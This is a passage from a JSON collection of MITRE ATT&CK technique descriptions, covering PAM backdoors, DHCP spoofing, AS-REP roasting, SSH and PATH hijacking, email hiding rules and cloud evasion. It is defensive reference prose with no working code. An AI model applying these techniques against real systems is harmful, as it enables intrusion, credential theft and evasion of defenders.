    "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)"
  ],
  "adversary-in-the-middle: dhcp spoofing": [
    "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. "
  ],
  "steal or forge kerberos tickets: as-rep roasting": [
    "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)"
  ],
  "impair defenses: disable or modify cloud firewall": [
    "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in AWS)\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed."
  ],
  "impair defenses: downgrade attack": [
    "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)\n\nAdversaries may downgrade and use less-secure versions of various features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557).(Citation: Praetorian TLS Downgrade Attack 2014)"
  ],
  "remote service session hijacking: ssh hijacking": [
    "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
  ],
  "hide artifacts: hidden file system": [
    "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)"
  ],
  "hide artifacts: email hiding rules": [
    "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)"
  ],
  "hide artifacts: resource forking": [
    "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)"
  ],
  "hide artifacts: process argument spoofing": [
    "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections."
  ],
  "dynamic resolution: dns calculation": [
    "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)\n\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)"
  ],
  "hijack execution flow: dylib hijacking": [
    "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)"
  ],
  "hijack execution flow: path interception by path environment variable": [
    "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line."
  ],
  "hijack execution flow: path interception by search order hijacking": [
    "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001)."
  ],
  "hijack execution flow: path interception by unquoted path": [
    "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process."
  ],
  "hijack execution flow: services registry permissions weakness": [
    "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)"
  ],
  "modify cloud compute infrastructure": [
    "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)"
  ],
  "modify cloud compute infrastructure: create snapshot": [
    "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)"
  ],
  "modify cloud compute infrastructure: create cloud instance": [
    "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances."
  ],
  "modify cloud compute infrastructure: delete cloud instance": [
    "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)"
  ],
  "modify cloud compute infrastructure: revert cloud instance": [
    "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)"
  ],
  "cloud infrastructure discovery": [
    "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves."
  ],
  "compromise infrastructure: web services": [
    "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them."
  ],
  "develop capabilities: digital certificates": [
    "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control."
  ],
  "develop capabilities: exploits": [
    "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004))."
  ],
  "gather victim network information: dns": [
    "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "gather victim network information: network trust dependencies": [
    "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "gather victim network information: ip addresses": [
    "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "gather victim host information": [
    "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "gather victim host information: firmware": [
